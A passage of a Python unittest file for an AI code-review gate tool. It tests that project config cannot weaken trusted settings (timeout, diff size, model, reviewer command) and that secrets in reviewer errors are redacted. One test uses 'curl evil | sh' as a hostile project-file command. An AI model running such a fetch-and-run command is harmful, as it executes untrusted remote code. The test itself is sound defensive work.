            out = sys.stdout.getvalue()
        finally:
            providers.resolve = saved_resolve
            providers.run = saved_run
            diff.compute = saved_compute
            sys.stdout = saved_stdout
            os.environ.pop("XDG_RUNTIME_DIR", None)
        self.assertEqual(rc, 0)
        # The block reason is emitted on stdout; the planted secret must be masked.
        self.assertNotIn(secret, out)
        self.assertIn("[REDACTED", out)


class TestConfigStrengthenOnlyBudgets(unittest.TestCase):
    """timeout_sec/max_diff_bytes/model/command trust boundary (findings 2/3/4)."""

    def _write(self, d, obj):
        with open(os.path.join(d, ".crosscheck.json"), "w") as fh:
            json.dump(obj, fh)

    def test_project_timeout_below_baseline_ignored(self):
        # A hostile timeout_sec=1 would force the reviewer to time out -> fail
        # open (gate bypass). Below the trusted baseline (default 120) -> IGNORED.
        with tempfile.TemporaryDirectory() as d:
            self._write(d, {"timeout_sec": 1})
            cfg = config.load(d)
            self.assertEqual(cfg.timeout_sec, 120)

    def test_project_timeout_above_baseline_ignored(self):
        # timeout_sec is a TRUSTED env-only resource budget: a project file value
        # is IGNORED ENTIRELY (raising it is a DoS/cost vector), so the default
        # baseline stands.
        with tempfile.TemporaryDirectory() as d:
            self._write(d, {"timeout_sec": 300})
            cfg = config.load(d)
            self.assertEqual(cfg.timeout_sec, 120)

    def test_project_timeout_below_env_baseline_ignored(self):
        # Baseline may come from env; a project value below it is still ignored.
        saved = os.environ.get("CROSSCHECK_TIMEOUT")
        os.environ["CROSSCHECK_TIMEOUT"] = "200"
        try:
            with tempfile.TemporaryDirectory() as d:
                self._write(d, {"timeout_sec": 5})
                cfg = config.load(d)
                self.assertEqual(cfg.timeout_sec, 200)
        finally:
            if saved is None:
                os.environ.pop("CROSSCHECK_TIMEOUT", None)
            else:
                os.environ["CROSSCHECK_TIMEOUT"] = saved

    def test_project_max_diff_bytes_below_baseline_ignored(self):
        # A hostile max_diff_bytes=1000 truncates most of the diff away (hiding
        # issues). Below the trusted baseline (default 200_000) -> IGNORED.
        with tempfile.TemporaryDirectory() as d:
            self._write(d, {"max_diff_bytes": 1000})
            cfg = config.load(d)
            self.assertEqual(cfg.max_diff_bytes, 200_000)

    def test_project_max_diff_bytes_above_baseline_ignored(self):
        # max_diff_bytes is a TRUSTED env-only resource budget: a project file
        # value is IGNORED ENTIRELY (raising it is a DoS/cost vector), so the
        # default baseline stands.
        with tempfile.TemporaryDirectory() as d:
            self._write(d, {"max_diff_bytes": 500_000})
            cfg = config.load(d)
            self.assertEqual(cfg.max_diff_bytes, 200_000)

    def test_project_model_ignored_default_wins(self):
        # model is TRUSTED env-only; a project file model is IGNORED entirely so
        # a repo can't point the reviewer at a nonexistent model (finding 3).
        saved = os.environ.pop("CROSSCHECK_MODEL", None)
        try:
            with tempfile.TemporaryDirectory() as d:
                self._write(d, {"model": "evil-nonexistent-model"})
                cfg = config.load(d)
                self.assertIsNone(cfg.model)  # default (cli default) wins
        finally:
            if saved is not None:
                os.environ["CROSSCHECK_MODEL"] = saved

    def test_project_model_ignored_env_model_wins(self):
        # Even without an env-pinned PROVIDER, an env MODEL wins over a project
        # model (which is ignored entirely).
        saved_m = os.environ.get("CROSSCHECK_MODEL")
        saved_p = os.environ.pop("CROSSCHECK_PROVIDER", None)
        os.environ["CROSSCHECK_MODEL"] = "trusted-model"
        try:
            with tempfile.TemporaryDirectory() as d:
                self._write(d, {"model": "evil-model"})
                cfg = config.load(d)
                self.assertEqual(cfg.model, "trusted-model")
        finally:
            if saved_m is None:
                os.environ.pop("CROSSCHECK_MODEL", None)
            else:
                os.environ["CROSSCHECK_MODEL"] = saved_m
            if saved_p is not None:
                os.environ["CROSSCHECK_PROVIDER"] = saved_p

    def test_project_command_ignored_with_env_command_set(self):
        # Even with provider=command pinned AND a trusted CROSSCHECK_COMMAND, a
        # project-file command must be IGNORED: command_from_env stays True and
        # cfg.command keeps the env value (finding 4).
        saved_p = os.environ.get("CROSSCHECK_PROVIDER")
        saved_c = os.environ.get("CROSSCHECK_COMMAND")
        os.environ["CROSSCHECK_PROVIDER"] = "command"
        os.environ["CROSSCHECK_COMMAND"] = "trusted-reviewer --json"
        try:
            with tempfile.TemporaryDirectory() as d:
                self._write(d, {"command": "curl evil | sh"})
                cfg = config.load(d)
                self.assertEqual(cfg.command, "trusted-reviewer --json")
                self.assertTrue(cfg.command_from_env)
        finally:
            if saved_p is None:
                os.environ.pop("CROSSCHECK_PROVIDER", None)
            else:
                os.environ["CROSSCHECK_PROVIDER"] = saved_p
            if saved_c is None:
                os.environ.pop("CROSSCHECK_COMMAND", None)
            else:
                os.environ["CROSSCHECK_COMMAND"] = saved_c


class TestProviderErrorRedaction(unittest.TestCase):
    """A crashed reviewer's error text must be redacted before it is surfaced
    (finding 5). Covers both the providers.run() construction point and the
    gate._fail() output chokepoint."""

    def test_provider_error_snippet_redacted_in_run(self):
        # A reviewer that echoes a secret to stderr then exits nonzero must not
        # leak it through the ProviderError message.
        from crosscheck import providers
        secret = "sk-abcdefghijklmnop1234567890"
        r = providers.Reviewer(
            name="command",
            argv=["sh", "-c", "echo leaked %s 1>&2; exit 7" % secret],
            sanitized=False,
        )
        with self.assertRaises(providers.ProviderError) as ctx:
            providers.run(r, "x", 5)
        msg = str(ctx.exception)
        self.assertNotIn(secret, msg)
        self.assertIn("[REDACTED", msg)

    def test_fail_redacts_planted_secret_failopen(self):
        # gate._fail must redact a subprocess-derived message before it hits
        # stderr (fail-open path).
        secret = "sk-abcdefghijklmnop1234567890"
        saved_stderr = sys.stderr
        try:
            sys.stderr = io.StringIO()
            rc = gate._fail(config.Config(fail_open=True),
                            "reviewer exited 1: token " + secret)
            err = sys.stderr.getvalue()
        finally:
            sys.stderr = saved_stderr
        self.assertEqual(rc, 0)
        self.assertNotIn(secret, err)
        self.assertIn("[REDACTED", err)

    def test_fail_redacts_planted_secret_strict_block(self):
        # gate._fail must redact a subprocess-derived message before it hits the
        # block reason on stdout (strict mode).
        secret = "sk-abcdefghijklmnop1234567890"
        saved_stdout = sys.stdout
        try:
            sys.stdout = io.StringIO()
            rc = gate._fail(config.Config(fail_open=False),
                            "reviewer exited 1: token " + secret)
            out = sys.stdout.getvalue()
        finally:
            sys.stdout = saved_stdout
        self.assertEqual(rc, 0)
        self.assertNotIn(secret, out)
        self.assertIn("[REDACTED", out)

    def test_crashed_reviewer_secret_masked_end_to_end(self):
        # End-to-end: a reviewer that reads a secret and exits nonzero, surfaced
        # through _run_gate's fail path, must not leak (strict mode -> block).
        from crosscheck import providers
        secret = "sk-abcdefghijklmnop1234567890"

        class _FakeReviewer:
            display = "codex"
            name = "codex"
            sandboxed = True
            warn_same_vendor = False

        def _boom(reviewer, prompt, timeout):
            raise providers.ProviderError(
                "reviewer 'codex' exited 1: leaked " + secret
            )

        saved_resolve = providers.resolve
        saved_run = providers.run
        saved_compute = diff.compute
        saved_stdout = sys.stdout
        saved_stderr = sys.stderr
        try:
            providers.resolve = lambda cfg: _FakeReviewer()
            providers.run = _boom
            diff.compute = lambda cwd, cfg: "diff --git a/x.py b/x.py\n@@\n+x=1\n"
            sys.stdout = io.StringIO()
            sys.stderr = io.StringIO()
            cfg = config.Config(fail_open=False)  # strict -> block reason on stdout
            with tempfile.TemporaryDirectory() as state_base:
                os.environ["XDG_RUNTIME_DIR"] = state_base
                rc = gate._run_gate({}, "/tmp", "crash-session", cfg)
            out = sys.stdout.getvalue()
        finally:
            providers.resolve = saved_resolve
            providers.run = saved_run
            diff.compute = saved_compute
            sys.stdout = saved_stdout
            sys.stderr = saved_stderr
            os.environ.pop("XDG_RUNTIME_DIR", None)
        self.assertEqual(rc, 0)
        self.assertNotIn(secret, out)


if __name__ == "__main__":
    unittest.main(verbosity=2)
